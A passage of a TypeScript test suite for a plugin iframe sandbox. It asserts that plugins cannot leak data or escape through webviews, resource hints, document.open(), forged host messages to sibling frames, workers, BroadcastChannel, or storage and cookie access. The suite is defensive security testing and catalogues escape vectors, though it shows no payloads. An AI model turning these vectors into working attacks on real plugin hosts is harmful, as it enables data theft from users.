    // Whitespace-padded on both paths, because that is what the platform trims
    // and a CSS attribute selector does not.
    expect(await waitFor(() => found, "the speculation-rules attack to finish")).toEqual([]);
  });

  it("cannot get an Electron webview guest into the document", async () => {
    let found: string[] | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; found?: string[] };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "webviews") {
        found = data.found ?? [];
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(WEBVIEW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    // Both orderings: `<webview>` written into the plugin's markup, which the
    // detached sanitiser should drop, and one appended by a plugin script, which
    // the sweep should drop. On the desktop build each of these is a guest
    // WebContents on an attacker-chosen origin with no CSP over it.
    expect(await waitFor(() => found, "the webview attack to finish")).toEqual([]);
  });

  it("cannot leak a hostname through a resource hint in its markup", async () => {
    let rels: string[] | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; rels?: string[] };
      if (data?.exfil === 1 && data.type === "hints") rels = data.rels ?? [];
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(RESOURCE_HINT_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    // Nested one included: the sanitiser has to walk the subtree, not just the
    // markup's top level.
    expect(await waitFor(() => rels, "the resource-hint attack to finish")).toEqual([]);
  });

  it("does not shed its policy by wiping the document with document.open()", async () => {
    const base = `${location.origin}/${EXFIL_MARKER}`;
    const imageUrl = `${location.origin}/pwa-icon-192.png?${EXFIL_MARKER}=wipe`;
    // Same control as the first test: this URL loads from the host, so a plugin
    // that cannot load it was refused rather than pointed at a dead file.
    expect(await loadImage(imageUrl)).toBe(true);

    let wiped: Record<string, unknown> | null = null;
    const iframe = createPluginIframe(DOCUMENT_OPEN_ATTACK_HTML);
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; out?: Record<string, unknown> };
      if (data?.exfil !== 1 || event.source !== iframe.contentWindow) return;
      if (data.type === "ready") {
        iframe.contentWindow?.postMessage({ exfil: 1, type: "attack", base, imageUrl }, "*");
      }
      if (data.type === "wiped") wiped = data.out ?? null;
    };
    window.addEventListener("message", onMessage);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const out = await waitFor<Record<string, unknown>>(() => wiped, "the document.open attack");
    // The wipe really happened — otherwise the rest of this proves nothing.
    expect(out.open).toBe("ok");
    expect(out.metas).toBe(0);
    // Starved: the only two ways to feed a script-created parser still throw.
    expect(out.write).toBe("threw");
    expect(out.writeln).toBe("threw");
    // Same realm, so the deletions stand.
    expect(out.rtc).toBe("undefined");
    // And the policy outlived the element that delivered it.
    expect(out.img).toBe("blocked");
    expect(out.fetch).toBe("blocked");
  });

  it("cannot impersonate the host to another plugin's frame", async () => {
    let attacker: { reached: number; nav: string } | null = null;
    let victim: { accepted: string[]; rejected: string[] } | null = null;
    let ready = 0;

    const victimFrame = createPluginIframe(SIBLING_VICTIM_HTML);
    const attackerFrame = createPluginIframe(SIBLING_ATTACKER_HTML);
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        out?: { reached: number; nav: string };
        accepted?: string[];
        rejected?: string[];
      };
      if (data?.exfil !== 1) return;
      if (data.type === "victim-ready" || data.type === "attacker-ready") {
        ready += 1;
        if (ready === 2) {
          // The genuine host message first, so "accepted" is not empty by
          // accident: a victim that accepts nothing at all proves nothing.
          victimFrame.contentWindow?.postMessage(
            {
              paseo: 1,
              type: "update",
              context: { kind: "file-preview", path: "budget.csv", content: "REAL" },
              theme: {},
            },
            "*",
          );
          attackerFrame.contentWindow?.postMessage({ exfil: 1, type: "attack" }, "*");
        }
      }
      if (data.type === "victim") {
        victim = { accepted: data.accepted ?? [], rejected: data.rejected ?? [] };
      }
      if (data.type === "attacker") attacker = data.out ?? null;
    };
    window.addEventListener("message", onMessage);
    document.body.appendChild(victimFrame);
    document.body.appendChild(attackerFrame);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      victimFrame.remove();
      attackerFrame.remove();
    });

    const reach = await waitFor<{ reached: number; nav: string }>(
      () => attacker,
      "the sibling attack to finish",
    );
    // Measured, not assumed: the forged message really does arrive. Nothing in
    // the host is on that path, so a plugin that trusts `paseo === 1` alone is
    // taking instructions from whatever else is open.
    expect(reach.reached).toBeGreaterThan(0);
    expect(reach.nav).toBe("denied");

    const seen = await waitFor<{ accepted: string[]; rejected: string[] }>(
      () => victim,
      "the victim's report",
    );
    expect(seen.accepted).toEqual(["update:REAL"]);
    expect(seen.rejected).toEqual(["update:FORGED"]);

    // And the contract has to say so, because the check is the plugin author's
    // to make and nothing in the host can make it for them.
    expect(pluginsDoc).toContain("event.source === window.parent");
    expect(pluginsDoc).not.toContain("Do not check `event.origin` or `event.source`");
  });

  it("has no second channel to a sibling, and no worker realm", async () => {
    let out: Record<string, string> | null = null;
    let victimLog: string[] | null = null;
    let ready = 0;

    const victimFrame = createPluginIframe(CHANNEL_VICTIM_HTML);
    const attackerFrame = createPluginIframe(CHANNEL_ATTACKER_HTML);
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        out?: Record<string, string>;
        log?: string[];
      };
      if (data?.exfil !== 1) return;
      if (data.type === "victim-ready" || data.type === "attacker-ready") {
        ready += 1;
        if (ready === 2) {
          attackerFrame.contentWindow?.postMessage(
            {
              exfil: 1,
              type: "attack",
              base: `${location.origin}/${EXFIL_MARKER}`,
              imageUrl: `${location.origin}/pwa-icon-192.png?${EXFIL_MARKER}=1`,
            },
            "*",
          );
        }
      }
      if (data.type === "attacker-out") {
        out = data.out ?? {};
        // Asked last, so the sibling has had every chance to reach it.
        victimFrame.contentWindow?.postMessage({ exfil: 1, type: "collect" }, "*");
      }
      if (data.type === "victim-log") victimLog = data.log ?? [];
    };
    window.addEventListener("message", onMessage);
    document.body.appendChild(victimFrame);
    document.body.appendChild(attackerFrame);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      victimFrame.remove();
      attackerFrame.remove();
    });

    const seen = await waitFor<Record<string, string>>(() => out, "the sibling channel sweep");
    const log = await waitFor<string[]>(() => victimLog, "the victim's channel log");

    // No fresh realm. The constructors do not throw — a worker fails
    // asynchronously — so the proof is that nothing ever reported from inside
    // one, and that the policy is what refused it.
    expect(seen.workerSaid).toBeUndefined();
    expect(seen.violations).toContain("worker-src");
    expect(seen.sharedWorker).toMatch(/^threw:/);

    // Constructed in both frames and still not a channel: two sandboxed frames
    // are two opaque origins.
    expect(log).toContain("bc-constructed");
    expect(seen.bcPost).toBe("sent");
    expect(log.some((entry) => entry.startsWith("bc-arrived"))).toBe(false);

    for (const key of [
      "localStorage",
      "sessionStorage",
      "indexedDB",
      "caches",
      "cookie",
      "serviceWorker",
      "siblingName",
      "namedLookup",
      "framesNamed",
      "setOpener",
    ]) {
      expect(seen[key], key).toMatch(/^threw:SecurityError/);
    }
    expect(seen.openNamed).toBe("null");

    // A plugin can add a policy; it cannot add an endpoint to send it to. A
    // report is a POST that `connect-src` never sees.
    expect(seen.violations).toContain("img-src");
    expect(seen.reports).toBe("none");
  });
});
